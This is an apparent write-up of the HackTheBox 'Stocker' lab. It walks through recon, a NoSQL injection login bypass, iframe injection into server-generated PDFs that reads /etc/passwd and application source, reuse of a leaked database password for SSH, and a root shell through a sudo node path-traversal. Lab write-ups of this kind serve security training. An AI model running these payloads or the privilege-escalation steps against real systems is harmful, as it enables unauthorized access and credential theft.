# Stocker

Stocker is a easy HTB lab that focuses on directory traversal, sensitive information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

### Recon
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
$ sudo nmap -p- -sV -sC 10.129.228.197

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-14 08:36 GMT
Nmap scan report for 10.129.228.197
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.87 seconds
```

Getting headers for the website.
```
$ curl -I 10.129.228.197
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 14 Jan 2024 08:36:47 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://stocker.htb
```

Adding new domains found to `/etc/hosts`.
```
sudo tee --append /etc/hosts <<< "10.129.228.197 stocker.htb"
```

We got there is one permission on website `angoose` as head.

Finding out if we have any subdomain here:
```
$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://stocker.htb -H "HOST: FUZZ.stocker.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 35ms]
:: Progress: [4997/4997] :: Job [1/1] :: 4954 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Added new subdomain `dev` found to `/etc/hosts`.

Enumerating the files and directory website:
```
$ feroxbuster -u http://dev.stocker.htb/ -A -k -d 4 --filter-status 404 --smart --output web.txt -w /usr/share/wordlists/dirb/big.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.stocker.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ web.txt
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🎶  Auto Tune             │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       28c http://dev.stocker.htb/ => http://dev.stocker.htb/login
200      GET       39l       62w      597c http://dev.stocker.htb/static/css/signin.css
200      GET       75l      200w     2667c http://dev.stocker.htb/login
200      GET       75l      200w     2667c http://dev.stocker.htb/Login
302      GET        1l        4w       28c http://dev.stocker.htb/logout => http://dev.stocker.htb/login
301      GET       10l       16w      179c http://dev.stocker.htb/static => http://dev.stocker.htb/static/
302      GET        1l        4w       48c http://dev.stocker.htb/stock => http://dev.stocker.htb/login?error=auth-required
301      GET       10l       16w      187c http://dev.stocker.htb/static/css => http://dev.stocker.htb/static/css/
301      GET       10l       16w      187c http://dev.stocker.htb/static/img => http://dev.stocker.htb/static/img/
```

### Attack

Nothing interesting here. So we can see if we can do any sql injection in the login form:
```
sqlmap -u 'http://dev.stocker.htb/login' --method post --data "username=angoose&password=pass" --cookie='connect.sid=s%3AI9kigT3WcSgW-Is9eTAxAWmfRppMe6t5.UIsXVI%2FoT0yQ6ZS0JtdABKsCcqBw1IRp53mp5UzQvDg' --random-agen --risk=3 --level=3
```
Didn't work. Since we know that Express, we can also try no-sql injection:
```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
DNT: 1
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3ArDy-RApeSmpmS2G8qZfnvBXAoLL1Tszu.gRerm1A0nwOnByrFP0RCYTvb%2BXjG9pPBJDCHhZcScMU
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```

Additional information, enumerating the website:
* Hugo 0.84.0
* API - /api/products, /api/po/${response.orderId}, /api/order


Sending the order information to figure out the fllow.
```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
Content-Length: 156
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://dev.stocker.htb
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3AfXnbTUiNIdMOj_RootGAndnItDfZ8xjY.UrNdF4kJe00lNPn5WWzaPwVIbzy2LNTnTzSho8y8Dt4
Connection: close

{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
```
Information from purchase order for PDF properties or exiftool.
* PDF producer:	Skia/PDF m108

Getting the details of the purchase order.
```
GET /api/po/65a4663e083ab738915e17f5 HTTP/1.1
Host: dev.stocker.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/stock
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3AfXnbTUiNIdMOj_RootGAndnItDfZ8xjY.UrNdF4kJe00lNPn5WWzaPwVIbzy2LNTnTzSho8y8Dt4
If-None-Match: W/"9496-18d0a2f7fe1"
If-Modified-Since: Sun, 14 Jan 2024 22:55:01 GMT
Connection: close
```

PDF-viewer in the chrome is used to show data from product. We can try to send custom data and see if it can get displayed like title, price, amount. So we can inject data in previous request and then payload will be injected in pdf.

```
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup<iframe
src='file:///etc/passwd' width='1000' height='1000'></iframe>","description":"It's a
red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":2}]}

root:x:0:0:root:/root:/bin/bash
...
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash

```
Checking the current `index.js` file
```

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup<iframe src='file:///var/www/dev/index.js' width='1000' height='1000'></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":2}]}

...
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:**************************@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
...
app.post("/login", async (req, res) => {
 const { username, password } = req.body;
 if (!username || !password) return res.redirect("/login?error=login-error");
 // TODO: Implement hashing
 const user = await mongoose.model("User").findOne({ username, password });
 if (!user) return res.redirect("/login?error=login-error");
...
```

Got credentials - `dev:**************************`.

Getting the user flag:
```
$ ssh angoose@stocker.htb
**************************
angoose@stocker:~$ cat user.txt 
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Checking what access as available as `sudo`.
```
$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```
Following javascript will give shell:
```
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});
```

Creating a new script file with javascript for launch shell and opening it using the sudo and node.
```
$ sudo /usr/bin/node /usr/local/scripts/node_modules/../../../../home/angoose/test.js 
# id
uid=0(root) gid=0(root) groups=0(root)
```

Getting the root flag:
```
# cat /root/root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
